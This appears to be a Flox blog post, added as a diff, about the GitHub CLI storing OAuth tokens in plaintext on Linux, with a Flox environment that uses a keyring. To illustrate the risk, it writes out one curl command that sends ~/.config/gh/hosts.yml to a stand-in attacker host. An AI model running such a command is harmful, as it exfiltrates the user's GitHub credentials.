@@ -1,0 +1,158 @@
+---
+title: 'Get Secure GitHub CLI Auth You Can Take with You Anywhere'
+altTitle: 'Get Secure GitHub CLI Auth You Can Take with You Anywhere'
+description: 'The GitHub CLI gives you a way to perform most GitHub-related tasks in your terminal. Get it with a prebuilt Flox environment wired for transparent auth with GitHub.'
+metaDescription: 'The GitHub CLI gives you a way to perform most GitHub-related tasks in your terminal. Get it with a prebuilt Flox environment wired for transparent auth with GitHub.'
+isPublished: true
+isPopularPackage: true
+packageCategory: development
+packageName: gh
+author: Steve Swoyer
+publishedDate: 21 March 2025
+thumbnail: '/images/blog/padlocks-in-the-desert.webp'
+orderBy: 20250321
+---
+
+This is a guide for Flox and the GitHub CLI, the command-line tool many of us use to interact with GitHub repositories, issues, pull requests, and workflows.
+
+Git itself is good enough in most cases—except when you need to create new GitHub repos, manage PRs, or trigger GitHub Actions jobs. That’s where `gh` comes to the rescue, giving you a way to do this in your terminal. You can also use `gh` to clone repos, create and push new repos in one command, fork and wire up remotes, and other tasks. If your workflows span GitHub, `gh` is nigh on an indispensable tool.
+
+As a special treat, this package guide features a prebuilt Flox environment wired for slightly more secure, transparent auth with GitHub on Linux platforms.
+
+Read on to discover how `gh`—and `gh` running in a Flox environment—can fit into your workflow.
+
+## Keep it like a secret
+
+Psst: GitHub CLI has an inconvenient little secret: it isn't always so good at keeping secrets.
+
+First, let’s stipulate that GitHub CLI behaves well on macOS systems, using that platform’s secure Keychain service by default. Its behavior on Linux platforms is more of a mixed bag, however.
+
+On Linux, `gh`’s default pattern is to _attempt_ to store GitHub OAUTH tokens using a system keyring. If for whatever reason this fails (see below), it persists the token to an unecrypted file, `hosts.yml`, which lives in `~/.config/gh/`. This is … not great. It isn’t just that anyone with access to your system can `cat ~/.config/gh/hosts.yml` to copy your token, it’s that **anything** with similar access can run `curl -s -d @~/.config/gh/hosts.yml https://i-am-trying-to-break-your-heart.io` and exfiltrate your creds.
+
+Most popular Linux distros ship with GNOME or KDE Plasma desktop environments. Each environment implements its own version of a keyring provider based on the Secret Service API spec. The problem is that `gh` doesn’t always use this. If it can’t talk to the local keyring (or if the keyring is locked, inaccessible, or just flaky), there’s a chance `gh` will silently fall back to using plaintext storage on Linux platforms.
+
+In most cases, you won’t know this has happened unless you investigate yourself:
+
+```
+$ gh auth status
+  ✓ Logged in to github.com account barstoolbluz (/home/daedalus/.config/gh/hosts.yml)
+  - Active account: false
+  - Git operations protocol: https
+  - Token: ghp_************************************
+  - Token scopes: 'admin:enterprise', 'admin:gpg_key', 'admin:org', 'admin:org_hook', 'admin:public_key', 'admin:repo_hook', 'admin:ssh_signing_key', 'audit_log', 'codespace', 'copilot', 'delete:packages', 'delete_repo', 'gist', 'notifications', 'project', 'repo', 'user', 'workflow', 'write:discussion', 'write:packages'
+```
+
+The token is redacted in the output above, but running `cat ~/.config/gh/hosts.yml` shows:
+
+```
+github.com:
+    users:
+        barstoolbluz:
+            oauth_token: ghp_IAMDESPERATELYSEEKINGANRTX5090
+    oauth_token: ghp_IAMDESPERATELYSEEKINGANRTX5090
+    user: barstoolbluz
+```
+
+You can build your own portable Flox environment that gives you `gh` auth using a keyring on Linux.
+
+Or you can just use the one I built.
+
+## Getting It
+
+First you need Flox. If you haven’t already [downloaded and installed it](https://flox.dev/docs/install-flox/), do so now.
+
+Once you’ve installed Flox, you can get my environment by running:
+
+```
+flox activate -r barstoolbluz/ghcli
+```
+
+This activates a FloxHub environment (hence the `-r` switch), which is cached locally. FloxHub environments give you an easy way to try out software without having to modify your global system state. As long as you're "inside" a FloxHub environment, the tools available to it are also available to you—but inaccessible to the rest of your system. Once you exit that environment, the session ends (but the cache remains for next time).
+
+You can see what packages are installed in a Flox environment by running **`flox list`**:
+
+```
+bat: bat (0.25.0)
+curl: curl (8.12.1)
+gh: gh (2.68.1)
+git: git (2.48.1)
+gum: gum (0.16.0)
+openssl: openssl (3.4.1)
+```
+
+Now that you have it, why not take it for a test drive?
+
+## Using It
+
+On Linux, the Secret Service API is only available if a compatible secrets manager, such as GNOME Keyring or KWallet, is also available. This isn’t guaranteed across all Linux environments.
+
+If a local secrets manager isn’t available, this environment falls back on using an encrypted local file, prompting for permission to do so. If you say “No,” the environment exits.
+
+First, let’s run a basic `gh` command just to confirm we can actually authenticate with GitHub:
+
+```
+$ gh auth status
+github.com
+  ✓ Logged in to github.com account barstoolbluz (keyring)
+  - Active account: true
+  - Git operations protocol: https
+  - Token: ghp_************************************
+  - Token scopes: 'admin:enterprise', 'admin:gpg_key', 'admin:org', 'admin:org_hook', 'admin:public_key', 'admin:repo_hook', 'admin:ssh_signing_key', 'audit_log', 'codespace', 'copilot', 'delete:packages', 'delete_repo', 'gist', 'notifications', 'project', 'repo', 'user', 'workflow', 'write:discussion', 'write:packages'
+```
+
+Looks good! Next, let’s try cloning a private repository—in this case, the Flox website. Since it’s private, GitHub authentication _has_ to work if the clone operation is to be successful:
+
+```
+$ gh repo clone flox/floxwebsite
+Cloning into 'floxwebsite'...
+...
+```
+
+Great! Now let’s create a fork of an existing GitHub repo—the FloxDocs website, which is public:
+
+```
+$ gh repo fork flox/floxdocs --clone
+! barstoolbluz/floxdocs already exists
+Cloning into 'floxdocs'...
+
+…
+! Repository flox/floxdocs set as the default repository. To learn more about the default repository, run: gh repo set-default --help
+```
+
+Now let’s dig into a workflow that involves creating and running a GitHub Action. First, we’ll create a repo:
+
+```
+$ gh repo create wsltoo-ollama --public --clone
+✓ Created repository barstoolbluz/wsltoo-ollama on GitHub
+  https://github.com/barstoolbluz/wsltoo-ollfama
+```
+
+Then we'll push it to GitHub:
+
+```
+$ git push -u origin master
+```
+
+Now let’s confirm our repo actually exists on GitHub:
+
+```
+$ gh repo view --web
+Opening https://github.com/barstoolbluz/wsltoo-ollama in your browser.
+$ Opening in existing browser session.
+```
+
+Is it there?
+
+![](/images/blog/gh-repo.png)
+
+Success!
+
+**Note:** This environment is intended primarily as a proof-of-concept. It has been verified to work with Gnome Keyring on Debian and Ubuntu, and should also work with KDE Kwallet on these platforms. There’s no reason it won’t work on Red Hat-based Linux platforms, but I haven’t tested it on these.
+
+I also haven’t tested it on macOS, although I did have Claude build in some supporting logic for that platform, too. This environment lives in [GitHub](https://github.com/barstoolbluz/ghcli), so if you find and fix any bugs, please push a PR. I’ll make sure to implement fixes in the canonical version on FloxHub, too.
+
+## Summary
+
+You probably know the spiel by now. GitHub CLI is just one of 150,000 packages you can find in the Flox Catalog, with millions of historical package-version combinations. (Running **`flox show gh`** tells me the Flox Catalog has 82 different versions of GitHub CLI; you can [search for yourself](https://hub.flox.dev/packages) if you’re curious.) You can use Flox to build powerful, portable environments that run and behave the same way everywhere—whether across OS platforms and architectures, or the complete SDLC, from local dev to CI to prod.
+
+Selah—I give you … The Weekend!
